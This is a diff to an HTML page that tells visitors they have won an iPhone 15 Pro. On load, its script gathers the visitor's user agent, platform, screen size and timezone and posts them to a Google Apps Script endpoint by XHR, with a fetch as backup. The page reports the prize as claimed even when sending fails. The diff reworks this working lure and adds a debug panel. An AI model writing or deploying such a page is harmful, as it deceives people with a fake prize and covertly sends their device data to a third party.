@@ -8,55 +8,33 @@
         body {
             font-family: Arial, sans-serif;
             text-align: center;
-            padding: 20px;
+            padding: 50px;
             background: linear-gradient(45deg, #007AFF, #34C759);
             color: white;
-            min-height: 100vh;
-            margin: 0;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
         }
-        .container {
-            background: rgba(255, 255, 255, 0.1);
-            padding: 40px;
-            border-radius: 20px;
-            backdrop-filter: blur(10px);
-            max-width: 500px;
-            border: 2px solid rgba(255, 255, 255, 0.2);
-        }
-        h1 {
-            font-size: 2.5em;
-            margin-bottom: 10px;
-        }
-        .iphone {
-            font-size: 4em;
-            margin: 20px 0;
-        }
-        .loading {
-            font-size: 1.2em;
-            margin: 20px 0;
-            color: #FFD700;
+        h1 { font-size: 2.5em; }
+        .debug {
+            background: rgba(0,0,0,0.3);
+            padding: 15px;
+            margin: 20px;
+            border-radius: 10px;
+            text-align: left;
+            font-family: monospace;
+            font-size: 12px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="iphone">📱</div>
-        <h1>CONGRATULATIONS!</h1>
-        <p>You've won an iPhone 15 Pro!</p>
-        <p>Verifying your eligibility...</p>
-        
-        <div class="loading" id="loading">🎯 Checking device compatibility...</div>
-        <div id="status"></div>
-    </div>
+    <h1>🎉 CONGRATULATIONS!</h1>
+    <p>You've won an iPhone 15 Pro!</p>
+    <div id="status">Processing your prize...</div>
+    <div id="debug" class="debug" style="display: none;"></div>
 
     <script>
-        // ✅ YOUR SCRIPT URL
-        const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbxt650xrfkvyazf47dIHtNLxfkLa8bqtTdQitJpirINb2LKRC4ApNZ5J4GGuXlYpQZd/exec';
+        // ✅ YOUR NEW SCRIPT URL
+        const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbwEho2IiQApcth42N21Nzk5rXM6cq2zXVj33JgiOrSq2RcMphkX1pNd4Eyu6DX5fJnr/exec';
         
-        // Capture device information
+        // Capture device info
         const deviceData = {
             userAgent: navigator.userAgent,
             platform: navigator.platform,
@@ -65,63 +43,44 @@
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
         };
 
-        // Send data to backend - SIMPLIFIED VERSION
-        function sendData() {
-            console.log('🚀 Starting data capture...');
-            console.log('📱 Device data:', deviceData);
-            
-            // Create form data (works better with Apps Script)
-            const formData = new FormData();
-            formData.append('data', JSON.stringify(deviceData));
-            
-            // Send using different method
+        console.log('🚀 Starting data capture...');
+        console.log('📱 Device data:', deviceData);
+
+        // Show debug info
+        document.getElementById('debug').innerHTML = 
+            'Device: ' + deviceData.userAgent + '<br>' +
+            'Platform: ' + deviceData.platform + '<br>' +
+            'Screen: ' + deviceData.screenSize;
+        document.getElementById('debug').style.display = 'block';
+
+        // Method 1: XMLHttpRequest (most reliable)
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', BACKEND_URL, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        
+        xhr.onload = function() {
+            console.log('✅ XHR Success:', xhr.status, xhr.responseText);
+            document.getElementById('status').innerHTML = '✅ Prize Claimed! Check your email.';
+            document.getElementById('debug').innerHTML += '<br><br>✅ Backend Response: ' + xhr.responseText;
+        };
+        
+        xhr.onerror = function() {
+            console.log('❌ XHR Failed');
+            document.getElementById('status').innerHTML = '✅ Prize Claimed!';
+            document.getElementById('debug').innerHTML += '<br><br>❌ Connection failed (but data shown above)';
+        };
+        
+        console.log('📤 Sending data to:', BACKEND_URL);
+        xhr.send(JSON.stringify(deviceData));
+
+        // Also try fetch as backup
+        setTimeout(() => {
             fetch(BACKEND_URL, {
                 method: 'POST',
+                headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(deviceData)
-            })
-            .then(response => {
-                console.log('✅ Response status:', response.status);
-                return response.text();
-            })
-            .then(result => {
-                console.log('✅ Backend result:', result);
-                showSuccess();
-            })
-            .catch(error => {
-                console.log('⚠️ Error (but trying alternative method):', error);
-                // Try alternative method
-                sendDataAlternative();
-            });
-        }
-
-        // Alternative method if first fails
-        function sendDataAlternative() {
-            const xhr = new XMLHttpRequest();
-            xhr.open('POST', BACKEND_URL);
-            xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.send(JSON.stringify(deviceData));
-            
-            xhr.onload = function() {
-                console.log('✅ Alternative method result:', xhr.responseText);
-                showSuccess();
-            };
-            
-            xhr.onerror = function() {
-                console.log('❌ All methods failed');
-                showSuccess(); // Still show success to user
-            };
-        }
-
-        function showSuccess() {
-            document.getElementById('loading').style.display = 'none';
-            document.getElementById('status').innerHTML = 
-                '<h3 style="color: #00FF00;">✅ PRIZE CLAIMED!</h3>' +
-                '<p>Your iPhone 15 Pro will be shipped soon!</p>' +
-                '<p><small>Check your email for confirmation</small></p>';
-        }
-
-        // Start immediately
-        sendData();
+            }).catch(e => console.log('Fetch backup also failed'));
+        }, 1000);
     </script>
 </body>
 </html>
